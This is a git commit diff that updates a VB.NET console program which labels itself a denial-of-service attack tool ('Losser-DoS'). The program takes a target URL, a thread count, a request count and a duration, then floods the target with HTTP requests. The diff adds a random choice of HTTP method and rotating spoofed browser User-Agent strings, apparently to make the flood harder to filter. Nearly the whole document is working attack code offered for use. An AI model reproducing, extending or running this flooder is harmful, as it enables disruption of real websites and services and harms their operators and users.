17c2325bbf472d9e4465e6aa6b4d2b0c300d2eb1
Nellose <151440407+Nellose@users.noreply.github.com>
2023-11-26 12:50:22 +0300

    Add files via upload

--- Losser-DoS/A.vb
+++ Losser-DoS/A.vb
@@ -1,23 +1,32 @@
 ﻿Imports System.Net.Http
+Imports System.Runtime.InteropServices
 Imports System.Threading
 
 ' By Nellose [https://github.com/Nellose], [https://nellose.github.io/Nellose-Web/] '
-
 Module Losser
+
     Sub Main()
-        Console.Title = "Nellose | DoS-Attack | VB .NET"
+        Console.Title = "Nellose | DoS-Attack | VB .NET | 2.0"
         Console.ForegroundColor = ConsoleColor.White
 
+        Console.ForegroundColor = ConsoleColor.Blue
         Console.Write("Enter the link: ")
+        Console.ForegroundColor = ConsoleColor.White
         Dim EEE As String = Console.ReadLine()
 
+        Console.ForegroundColor = ConsoleColor.Blue
         Console.Write("Enter the number of threads: ")
+        Console.ForegroundColor = ConsoleColor.White
         Dim YYY As Integer = Convert.ToInt32(Console.ReadLine())
 
+        Console.ForegroundColor = ConsoleColor.Blue
         Console.Write("Enter the number of requests: ")
+        Console.ForegroundColor = ConsoleColor.White
         Dim ZZZ As Integer = Convert.ToInt32(Console.ReadLine())
 
+        Console.ForegroundColor = ConsoleColor.Blue
         Console.Write("Enter the attack time in seconds: ")
+        Console.ForegroundColor = ConsoleColor.White
         Dim XXX As Integer = Convert.ToInt32(Console.ReadLine())
 
         Console.Clear()
@@ -31,44 +40,34 @@ Module Losser
             thread.Start()
         Next
 
-        Thread.Sleep(XXX * 1000)
-
-        Console.Clear()
-        Console.ForegroundColor = ConsoleColor.Cyan
-        Console.WriteLine("Monitoring:")
-        Console.WriteLine($"Successful requests: {CCC}")
-        Console.WriteLine($"Unsuccessful requests: {GGG}")
-        Console.WriteLine($"Attack time: {(DateTime.Now - RRR).TotalSeconds} secound(s)")
     End Sub
-
-    ' By Nellose [https://github.com/Nellose], [https://nellose.github.io/Nellose-Web/] '
 
     Sub SSS(EEE As String, ZZZ As Integer, XXX As Integer, ByRef CCC As Integer, ByRef GGG As Integer, RRR As DateTime)
         For i As Integer = 1 To ZZZ
             Try
-                Dim requestTypes As String() = {"GET", "POST", "PUT", "HEAD", "JSON"}
-                For Each requestType In requestTypes
-                    Dim VVV As String = AAA()
+                Dim requestTypes As String() = {"GET", "POST", "PUT", "HEAD", "JSON", "DELETE", "OPTIONS"} ' (1)
+                Dim randomRequestType As String = requestTypes(New Random().Next(requestTypes.Length)) ' (1)
 
-                    Using client As New HttpClient()
-                        client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
+                Dim VVV As String = AAA()
 
-                        Dim response As HttpResponseMessage = client.PostAsync(EEE, New StringContent(VVV)).Result
+                Using client As New HttpClient()
+                    client.DefaultRequestHeaders.Add("User-Agent", GenerateRandomUserAgent()) ' (2)
 
-                        If response.IsSuccessStatusCode Then
-                            CCC += 1
-                        Else
-                            GGG += 1
-                        End If
-                    End Using
-                Next
+                    Dim response As HttpResponseMessage = client.SendAsync(New HttpRequestMessage(New HttpMethod(randomRequestType), EEE) With {
+                        .Content = New StringContent(VVV)
+                    }).Result
+
+                    If response.IsSuccessStatusCode Then
+                        CCC += 1
+                    Else
+                        GGG += 1
+                    End If
+                End Using
             Catch ex As Exception
                 GGG += 1
             End Try
         Next
     End Sub
-
-    ' By Nellose [https://github.com/Nellose], [https://nellose.github.io/Nellose-Web/] '
 
     Function AAA() As String
         Dim random As New Random()
@@ -80,6 +79,18 @@ Module Losser
         Next
 
         Return data.ToString()
+    End Function
+
+    Function GenerateRandomUserAgent() As String ' (2)
+        Dim userAgents As String() = {
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0.2",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) OPR/77.0.4054.277"
+        }
+
+        Return userAgents(New Random().Next(userAgents.Length))
     End Function
 End Module
 
